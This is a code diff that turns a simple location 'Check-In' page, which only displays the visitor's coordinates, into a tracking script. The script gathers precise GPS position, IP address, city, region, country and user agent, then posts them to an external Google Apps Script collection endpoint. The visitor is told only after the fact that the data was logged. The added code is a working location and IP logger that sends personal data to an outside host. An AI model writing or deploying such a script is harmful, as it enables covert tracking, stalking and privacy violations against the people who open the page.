@@ -1,29 +1,49 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Location Tracker</title>
-</head>
-<body>
-  <h1>Check-In</h1>
-  <p>We need your location to complete the check-in. Please allow location access when prompted.</p>
-
-  <script>
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          // Show location on screen
-          document.body.innerHTML += `<p>Your location: ${latitude}, ${longitude}</p>`;
-        },
-        function(error) {
-          alert("Location access denied or unavailable.");
-        }
-      );
-    } else {
-      alert("Geolocation not supported in your browser.");
+<script>
+  async function logVisitorInfo() {
+    if (!('geolocation' in navigator)) {
+      alert("Geolocation not supported by your browser.");
+      return;
     }
-  </script>
-</body>
-</html>
+
+    // Fetch visitor IP & location info from ipapi.co
+    let ipData = {};
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      ipData = await response.json();
+    } catch (e) {
+      console.error("Failed to fetch IP info", e);
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const userAgent = navigator.userAgent;
+
+        const payload = {
+          lat: latitude,
+          lon: longitude,
+          userAgent: userAgent,
+          ip: ipData.ip || "unknown",
+          city: ipData.city || "unknown",
+          region: ipData.region || "unknown",
+          country: ipData.country_name || "unknown",
+          timestamp: new Date().toISOString()
+        };
+
+        fetch("https://script.google.com/macros/s/AKfycbxtdDmGdRr74pDBxGVSVKoK5OtSzlpepW7_AzpDxwwjB7bTVvjRfHaJ0uvg6so0GpFL5Q/exec", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        document.body.innerHTML += `<p>Thanks! Your location and IP info have been logged.</p>`;
+      },
+      function(error) {
+        alert("Location access denied or unavailable.");
+      }
+    );
+  }
+
+  logVisitorInfo();
+</script>
